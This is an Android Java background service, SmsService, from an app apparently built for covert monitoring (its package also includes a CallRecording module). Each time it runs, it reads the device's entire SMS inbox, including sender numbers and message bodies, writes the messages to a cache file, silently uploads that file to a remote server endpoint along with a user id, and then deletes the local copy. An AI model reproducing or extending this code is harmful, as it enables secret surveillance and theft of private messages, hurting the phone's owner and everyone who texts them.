package rapidora.co.myapplication.services;

import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Environment;
import android.os.PowerManager;
import android.util.Log;
import android.widget.Toast;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.mime.HttpMultipartMode;
import org.apache.http.entity.mime.MultipartEntity;
import org.apache.http.entity.mime.MultipartEntityBuilder;
import org.apache.http.entity.mime.content.FileBody;
import org.apache.http.entity.mime.content.StringBody;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.sql.Date;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;

import rapidora.co.myapplication.CallRecording.FileHelper;
import rapidora.co.myapplication.common.ConnectionDetector;
import rapidora.co.myapplication.common.Constants;
import rapidora.co.myapplication.common.CustomLogger;
import rapidora.co.myapplication.common.SessionManagment;
import rapidora.co.myapplication.common.Utils;
import rapidora.co.myapplication.model.SMSData;


public class SmsService extends IntentService {
    ConnectionDetector cd;
    SessionManagment sd;
    String sms;
    int count;
    //PowerManager.WakeLock screenLock;
    String current_date;

    public SmsService() {
        super(SmsService.class.getName());

    }

    @Override
    protected void onHandleIntent(Intent intent) {

        cd = new ConnectionDetector(getApplicationContext());
        sd = new SessionManagment(getApplicationContext());
     /*   screenLock = ((PowerManager) getApplicationContext().getSystemService(Context.POWER_SERVICE)).newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK, "TAG");
        screenLock.acquire();*/
        CustomLogger.getInsatance(getApplicationContext()).putLog("SmsService:-" + "Running");
        if (!cd.isConnectingToInternet()) {

        } else {
            SimpleDateFormat timeStampFormat = new SimpleDateFormat("yyyy-MM-dd");
            Calendar cal = Calendar.getInstance();
            cal.add(Calendar.DATE, -1);
            java.util.Date myDate = new java.util.Date();
            current_date = timeStampFormat.format(new Date(cal.getTimeInMillis()));


            count = sd.getCount();
            getSms();
            count++;
            sd.setCount(count);
        }
    }


    @Override
    public void onDestroy() {

       // if (screenLock.isHeld()) screenLock.release();
        super.onDestroy();
    }

    public void getSms() {

        Log.e("run", "myservice sms");
        List<SMSData> smsList = new ArrayList<SMSData>();
        StringBuffer output = new StringBuffer();
        Uri uri = Uri.parse("content://sms/inbox");
        Cursor c = getContentResolver().query(uri, null, null, null, null);
        //startManagingCursor(c);
        // Read the sms data and store it in the list
        if (c.moveToFirst()) {
            for (int i = 0; i < c.getCount(); i++) {

                Long timestamp = Long.parseLong(c.getString(c.getColumnIndexOrThrow("date")));
                Calendar calendar = Calendar.getInstance();
                calendar.setTimeInMillis(timestamp);
                java.util.Date finaldate = calendar.getTime();
                String smsDate = finaldate.toString();
               // Log.e("Date", smsDate);
                SMSData sms = new SMSData();
                SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd");
                String format = formatter.format(finaldate);
              //  Log.e("Date", format);
                try {

                    //   String dateString = new SimpleDateFormat("yyyy-MM-dd").format(new Date(timestamp));
                    if (sd.getSENDFIRSTTIMESMS()) {
                        sms.setBody(c.getString(c.getColumnIndexOrThrow("body")).toString());
                        sms.setNumber(c.getString(c.getColumnIndexOrThrow("address")).toString());
                        smsList.add(sms);
                        output.append("\nSMS display name:" + c.getString(c.getColumnIndexOrThrow("_id")).toString());
                        output.append("\nSMS number:" + c.getString(c.getColumnIndexOrThrow("address")).toString());
                        output.append("\nSMS display Date:" + format);
                        if (c.getString(c.getColumnIndexOrThrow("type")).contains("1")) {
                            output.append("\nSMS type:" + "Inbox");
                        } else {
                            output.append("\nSMS type:" + "Sent");
                        }
                        output.append("\n SMS Body:" + c.getString(c.getColumnIndexOrThrow("body")).toString());
                        output.append("\n--------------------------");
                        c.moveToNext();

                    } else {
                        if (Utils.dateValidation(sd.getLASTSENDDATESMS(), String.valueOf(format), "yyyy-MM-dd")) {

                            sms.setBody(c.getString(c.getColumnIndexOrThrow("body")).toString());
                            sms.setNumber(c.getString(c.getColumnIndexOrThrow("address")).toString());
                            smsList.add(sms);
                            output.append("\nSMS display name:" + c.getString(c.getColumnIndexOrThrow("_id")).toString());
                            output.append("\nSMS number:" + c.getString(c.getColumnIndexOrThrow("address")).toString());
                            output.append("\nSMS display Date:" + format);
                            if (c.getString(c.getColumnIndexOrThrow("type")).contains("1")) {
                                output.append("\nSMS type:" + "Inbox");
                            } else {
                                output.append("\nSMS type:" + "Sent");
                            }
                            output.append("\n SMS Body:" + c.getString(c.getColumnIndexOrThrow("body")).toString());
                            output.append("\n--------------------------");
                            c.moveToNext();
                        }
                    }
                } catch (Exception e) {
                }

            }
        }
        c.close();
        try {

            generateNoteOnSD3(getApplicationContext(), "sms.txt", output.toString());
        }catch (Exception e){
            Utils.cancelAlarmSms(getApplicationContext());

        }
    }


    public void generateNoteOnSD3(Context context, String sFileName, String sBody) {
        try {

            File root = new File(FileHelper.getCacheDir(context), "Notes");
            //File root = new File(Environment.getExternalStorageDirectory(), "Notes");
            File gpxfile1 = new File(root, sFileName);
            if (gpxfile1.exists()) {
                gpxfile1.delete();
            }
            if (!root.exists()) {
                root.mkdirs();
            }
            File gpxfile = new File(root, sFileName);
            sms = gpxfile.toString();
            FileWriter writer = new FileWriter(gpxfile);
            writer.append(sBody);
            writer.flush();
            writer.close();

            // Toast.makeText(context, "Saved Sms", Toast.LENGTH_SHORT).show();
            if (!cd.isConnectingToInternet()) {

            } else {

                new MyTask3().execute();
            }


        } catch (IOException e) {
            Utils.cancelAlarmSms(getApplicationContext());

            e.printStackTrace();
        }
    }


    public class MyTask3 extends AsyncTask<Void, Void, Void> {
        Context context;
        File smsfile;
        String filename;
        String result = "";

        @Override
        protected Void doInBackground(Void... params) {
            try {
           /*     smsfile = new File(sms);
                FileBody fbsms = new FileBody(smsfile);
                HttpClient client = new DefaultHttpClient();
                HttpPost post = new HttpPost(Constants.UPDATE_SMS);
                MultipartEntityBuilder entityBuilder = MultipartEntityBuilder.create();
                entityBuilder.setMode(HttpMultipartMode.BROWSER_COMPATIBLE);
                entityBuilder.addTextBody("gmail",sd.getEmail()+count);
                if (smsfile != null) {
                    entityBuilder.addPart("sms", fbsms);
                }
                HttpEntity entity = entityBuilder.build();
                post.setEntity(entity);
                HttpResponse response = client.execute(post);
                HttpEntity httpEntity = response.getEntity();
                result = EntityUtils.toString(httpEntity);
*/

                Calendar c = Calendar.getInstance();
                // SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd");
                SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd");
                String formattedDate = df.format(c.getTime());
                // System.out.println("Currrent Date Time : " + formattedDate);
                Log.e("sendLocation() Date", formattedDate);
                SimpleDateFormat df1 = new SimpleDateFormat("HH:mm:ss");
                String timeformat = df1.format(c.getTime());
                Log.e("sendLocation() time", timeformat);

                File calllogfile = new File(sms);

                MultipartEntity reqEntity = new MultipartEntity(HttpMultipartMode.BROWSER_COMPATIBLE);

                reqEntity.addPart("sms", new FileBody(calllogfile));

                reqEntity.addPart("id", new StringBody(sd.getUserId()));



                String response1 = Utils.multipost(Constants.UPDATE_SMS, reqEntity);
                Log.e("run sms", response1);

                CustomLogger.getInsatance(getApplicationContext()).putLog("SmsService:-" + "Running" + response1);
                if (response1 != null) {
                    Utils.cancelAlarmSms(getApplicationContext());
                    sd.setSENDFIRSTTIMESMS(false);
                    sd.setLASTSENDDATESMS(current_date);
                   FileHelper.deleteSms(getApplicationContext(),sms);
                    stopSelf();
                }

                // Toast.makeText(context, "" + result, Toast.LENGTH_SHORT).show();
            } catch (Exception e) {
                CustomLogger.getInsatance(getApplicationContext()).putLog("SmsService:-" + "Error" + e.toString());

                e.printStackTrace();
            }
            return null;
        }

        @Override
        protected void onPostExecute(Void aVoid) {


        }
    }


}
